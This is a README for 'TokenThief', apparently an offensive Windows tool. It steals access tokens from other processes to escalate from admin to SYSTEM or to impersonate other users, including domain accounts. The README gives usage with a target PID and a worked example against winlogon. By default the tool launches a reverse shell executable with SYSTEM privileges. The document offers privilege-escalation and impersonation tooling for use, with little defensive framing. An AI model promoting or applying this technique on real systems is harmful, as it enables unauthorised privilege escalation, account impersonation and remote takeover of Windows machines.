# TokenThief

A tool to steal access tokens from other running processes on Windows and run an executable on a different security context. It can mainly be used to escalate privileges from admin to SYSTEM account, or impersonate any other user withing the system running a process (e.g. a domain account).
 
The tool is required SeDebugPrivilege to be executed, therefore an elevated prompt will be required.
 
## Usage
 
 .\TokenThief.exe <PID of the targer process>
 
The tool is executing a "C:\temp\shell.exe" reverse shell by default. The "command" can be changed in the source code to execute any other binary file. 
 
 
 ## Example
Getting the PID of a SYSTEM level process first, such as winlogon, and the tool will execute the shell.exe file with SYSTEM privileges.
```
PS> Get-Process winlogon
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    274      12     2716      11480       0.25    996   1 winlogon

PS> .\TokenThief.exe 996
Process successfully created...
```
